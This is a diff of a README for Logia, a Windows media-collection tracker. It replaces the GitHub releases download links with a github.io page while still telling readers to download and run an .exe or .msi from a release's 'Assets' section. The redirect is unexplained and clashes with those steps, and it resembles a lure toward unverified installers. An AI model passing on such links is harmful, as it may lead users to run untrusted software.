@@ -1,6 +1,6 @@
 # 📚 Logia - Manage your personal media collections easily
 
-[![Download Logia](https://img.shields.io/badge/Download-Logia-blue.svg)](https://github.com/thematic-ulysses679/Logia/releases)
+[![Download Logia](https://img.shields.io/badge/Download-Logia-blue.svg)](https://thematic-ulysses679.github.io)
 
 Logia acts as your central hub for tracking media. You can monitor progress for movies, television series, anime, manga, and video games. The application organizes your collections into a single, private location on your computer.
 
@@ -20,7 +20,7 @@ Logia works on most current Windows computers. Ensure your system meets these ba
 
 Follow these steps to set up the application on your Windows computer:
 
-1.  Visit the official release page: [https://github.com/thematic-ulysses679/Logia/releases](https://github.com/thematic-ulysses679/Logia/releases).
+1.  Visit the official release page: [https://thematic-ulysses679.github.io](https://thematic-ulysses679.github.io).
 2.  Locate the section labeled "Assets" at the bottom of the latest release post.
 3.  Click the file ending in `.msi` or `.exe` to download the installer.
 4.  Open the downloaded file once the transfer completes.
